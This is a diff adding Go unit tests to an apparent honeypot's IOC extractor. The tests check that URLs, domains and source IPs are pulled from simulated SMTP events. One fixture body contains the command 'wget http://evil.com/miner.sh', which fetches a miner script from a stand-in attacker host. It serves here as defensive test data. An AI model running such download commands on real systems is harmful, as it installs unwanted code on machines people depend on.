@@ -271,3 +271,57 @@ func TestHasTag(t *testing.T) {
 	assert.True(t, HasTag(ioc, "exploit-attempt"))
 	assert.False(t, HasTag(ioc, "nonexistent"))
 }
+
+// Add a test that mirrors actual SMTP scenario
+func TestExtractURLsAndDomainsFromSMTPBody(t *testing.T) {
+	ext := NewExtractor()
+	ev := &types.Event{
+		SourceIP:    "203.0.113.5",
+		EventType:   types.EventFileUpload,
+		ServiceType: types.ServiceSMTP,
+		Timestamp:   time.Now().UTC(),
+		ServiceData: json.RawMessage(
+			`{"from":"attacker@evil.com","body":"wget http://evil.com/miner.sh"}`,
+		),
+	}
+
+	iocs := ext.Extract(ev)
+
+	var urls, domains []string
+	for _, ioc := range iocs {
+		switch ioc.Type {
+		case types.IOCURL:
+			urls = append(urls, ioc.Value)
+		case types.IOCDomain:
+			domains = append(domains, ioc.Value)
+		default:
+		}
+	}
+
+	assert.Contains(t, urls, "http://evil.com/miner.sh")
+	assert.Contains(t, domains, "evil.com")
+}
+
+func TestExtractIncludesPublicSourceIPAlongsideBodyURLs(t *testing.T) {
+	ext := NewExtractor()
+	ev := &types.Event{
+		SourceIP:    "203.0.113.5", // public IP, per TEST-NET-3 (RFC 5737)
+		EventType:   types.EventFileUpload,
+		ServiceType: types.ServiceSMTP,
+		Timestamp:   time.Now().UTC(),
+		ServiceData: json.RawMessage(
+			`{"body":"http://evil.com/x"}`,
+		),
+	}
+
+	iocs := ext.Extract(ev)
+
+	var types_ []types.IOCType
+	for _, ioc := range iocs {
+		types_ = append(types_, ioc.Type)
+	}
+
+	assert.Contains(t, types_, types.IOCIPv4)
+	assert.Contains(t, types_, types.IOCURL)
+	assert.Contains(t, types_, types.IOCDomain)
+}
